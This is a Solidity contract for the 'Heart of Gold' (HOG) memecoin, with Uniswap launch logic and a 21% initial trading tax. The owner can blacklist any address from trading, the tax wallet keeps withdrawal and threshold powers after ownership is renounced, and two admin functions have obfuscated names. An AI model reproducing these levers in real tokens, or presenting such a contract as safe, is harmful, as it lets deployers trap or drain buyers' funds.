/*


https://x.com/cb_doge/status/1927059140339175662




*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Contract is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    address payable private _taxWallet;

    uint256 private _initialBuyTax = 21;
    uint256 private _initialSellTax = 21;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 0;
    uint256 private _reduceSellTaxAt = 18;
    uint256 private _preventSwapBefore = 3;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Heart of Gold";
    string private constant _symbol = unicode"HOG";
    uint256 public _maxTxAmount = 8413800000 * 10**_decimals;
    uint256 public _maxWalletSize = 8413800000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 6413800000 * 10**_decimals;
    uint256 public _maxTaxSwap = 6413800000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private transferDelayEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal * 90 / 100;
        _balances[_msgSender()] = _tTotal * 10 / 100;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        bots[0x19779C6290ECeaaeD8de728c627cFF78bBe8d562] = true;
        bots[0x40C16B3727593E7D0B64413E332CC2F9D8025115] = true;
        bots[0xB323d6C5fB1658269cB0E66Fe990348B084ccd9a] = true;
        bots[0xb07dd7c99174b3b96edaCc027Ce75873287A7636] = true;
        bots[0x66FB8623656929Cd9c02Ff693C96863ecF27003c] = true;
        bots[0x75423CFb9599a4976c587cfd1a33ce9961Ac0d21] = true;
        bots[0x86653fA95Cb3336b903383A98a1fa21d57DaAf8d] = true;
        bots[0x56a86a31aD7E7dF40351d58FE091ECa2C6Fff4b9] = true;
        bots[0x4f7830D386Ee525f05882356Eab2B1827e65a6B0] = true;
        bots[0x70dDf530E4abF300A92D947C131b32CDbA33a2C4] = true;
        bots[0xBd19de3587f56a89fb0dB2d514c847F7D47ab322] = true;
        bots[0x41302B4968ce2b2EB7ed17fe6B69B80B119f592a] = true;
        bots[0x9E263c5aE596D1210531e8222874b6f5fa942B7e] = true;
        bots[0xF9213ECdb1F0443E0e4d1Aa3c9CA7074C473D5e4] = true;
        bots[0x3f890F67d2DA8824b13709c3656505a696D9FA05] = true;
        bots[0xd57e147804fc335893a110B3885ddCD314f4B30F] = true;
        bots[0x8F45B1419b371Db9fDaC4e33d147a99cf20E7ce2] = true;
        bots[0x61842B484AA8204C70B6E788A6A330b12AbfBCaf] = true;
        bots[0x1c0031F2564776171424869139d21ff36f5c5a4a] = true;
        bots[0xf626826f66FD154F019d8F2459C5D8B0f5ed3eeb] = true;
        bots[0x918Ba1D8fD9B82473B7DDDc01bE84D8abc16AdaA] = true;
        bots[0x3862De24806108b8218886Fb499B3c0A80F4A739] = true;
        bots[0x466c7f6962003a274Ce27171C8906A50745Adf5E] = true;
        bots[0x020Be546F9D802FD004B1dA3a202B1923da2cD38] = true;
        bots[0xf53c60D35976306Edb9496E9C617F311862Da723] = true;

        emit Transfer(address(0), address(this), _tTotal * 90 / 100);
        emit Transfer(address(0), _msgSender(), _tTotal * 10 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to] && !bots[tx.origin]);

            if (transferDelayEnabled) {
                if (
                    to != owner() &&
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled. Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (_buyCount == 0) {
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);
            }
            if (_buyCount > 0) {
                taxAmount = amount.mul(_transferTax).div(100);
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                uint256 contractTokenPct = contractTokenBalance.mul(100).div(_tTotal);

                if (contractTokenPct < 2) {
                    _taxSwapThreshold = type(uint256).max;
                    _maxTaxSwap = type(uint256).max;
                } else if (contractTokenPct < 7) {
                    _taxSwapThreshold = _tTotal * 12 / 10000; // 0.25%
                    _maxTaxSwap = _tTotal * 12 / 10000;
                } else if (contractTokenPct < 14) {
                    _taxSwapThreshold = _tTotal * 4 / 1000; // 0.5%
                    _maxTaxSwap = _tTotal * 4 / 1000;
                }

                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }

                require(sellCount < 3, "Only 3 sells per block!");

                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(contractETHBalance);
                }

                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits55ihv89098f5chfii79mmkjj654(bool _bool) external onlyOwner {
        if (_bool) {
            uint256 amountToSend = _tTotal * 8 / 100;
            _transfer(_taxWallet, address(this), amountToSend);
        }

        _taxSwapThreshold = _taxSwapThreshold * 70 / 100;
        _maxTaxSwap = _maxTaxSwap * 70 / 100;
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;

        emit MaxTxAmountUpdated(_tTotal);
    }

    function removeTransferTax() external onlyOwner {
        _transferTax = 0;
        emit TransferTaxUpdated(0);
    }

    function manualsend() external {
        require(_msgSender() == _taxWallet, "Not authorized");
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBots(address bot) public onlyOwner {
        bots[bot] = true;
    }

    function delBots(address notBot) public onlyOwner {
        bots[notBot] = false;
    }

    function rescueERC20(address _address, uint256 percent) external {
        require(_msgSender() == _taxWallet, "Not authorized");
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_taxWallet, _amount);
    }

    function setSwapTreshold5575799809844908955h55555435(uint256 _new) external {
        require(_msgSender() == _taxWallet, "Not authorized");
        _taxSwapThreshold = _new;
        _maxTaxSwap = _new;
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        
        // Compute the pair address
        address factory = uniswapV2Router.factory();
        address weth = uniswapV2Router.WETH();
        address predictedPair = pairFor(factory, address(this), weth);
        
        // Check if the pair exists by checking its code size
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(predictedPair)
        }
        
        // If pair doesn't exist, create it
        if (codeSize == 0) {
            uniswapV2Pair = IUniswapV2Factory(factory).createPair(address(this), weth);
        } else {
            uniswapV2Pair = predictedPair;
            // Optional: Check pair balances to ensure it's not manipulated
            uint256 tokenBalance = IERC20(address(this)).balanceOf(uniswapV2Pair);
            uint256 wethBalance = IERC20(weth).balanceOf(uniswapV2Pair);
            require(tokenBalance < 1e18 && wethBalance < 1e18, "Pair already funded");
        }
        
        // Approve tokens for the router
        _approve(address(this), address(uniswapV2Router), _tTotal);
        
        // Add liquidity
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)) * 92 / 100,
            0,
            0,
            owner(),
            block.timestamp
        );
    
        // Approve pair for router
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        
        swapEnabled = true;
        tradingOpen = true;
        transferDelayEnabled = true;
    }

    function openTradingPairCreatedAlready(address existingPair) external payable onlyOwner {
        require(!tradingOpen, "Trading is already open");
        require(existingPair != address(0), "Invalid pair address");

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address factory = uniswapV2Router.factory();
        address weth = uniswapV2Router.WETH();

        // Verify pair
        address pair = IUniswapV2Factory(factory).getPair(address(this), weth);
        require(pair == existingPair, "Pair does not match");
        uniswapV2Pair = existingPair;

        // Check pair reserves
        uint256 reserveToken = IERC20(address(this)).balanceOf(uniswapV2Pair);
        uint256 reserveWETH = IERC20(weth).balanceOf(uniswapV2Pair);
        require(reserveToken < 1e18 && reserveWETH < 1e18, "Pair already funded");

        // Calculate sync token amount
        uint256 tokenAmount = _tTotal * 92 / 100; // 92% of supply
        uint256 syncAmount = reserveWETH > 0 ? tokenAmount.mul(reserveWETH).div(10**18) : 1000000; // Default to 0.000001 tokens if no WETH

        // Transfer tokens to sync pair
        _balances[address(this)] = _balances[address(this)].sub(syncAmount);
        _balances[uniswapV2Pair] = _balances[uniswapV2Pair].add(syncAmount);
        emit Transfer(address(this), uniswapV2Pair, syncAmount);

        // Approve router
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Add liquidity
        uint256 ethAmount = msg.value;
        require(ethAmount >= 0.1 ether, "Minimum 0.1 ETH required");

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );

        // Approve pair for router
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);

        swapEnabled = true;
        tradingOpen = true;
        transferDelayEnabled = true;
    }

   

    function pairFor(address factory, address tokenA, address tokenB) private pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint160(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
        )))));
    }

    function reduceFee(uint256 _newFee) external {
        require(_msgSender() == _taxWallet, "Not authorized");
        require(_newFee <= _finalBuyTax && _newFee <= _finalSellTax, "Invalid fee");
        _finalBuyTax = _newFee;
        _finalSellTax = _newFee;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet, "Not authorized");
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}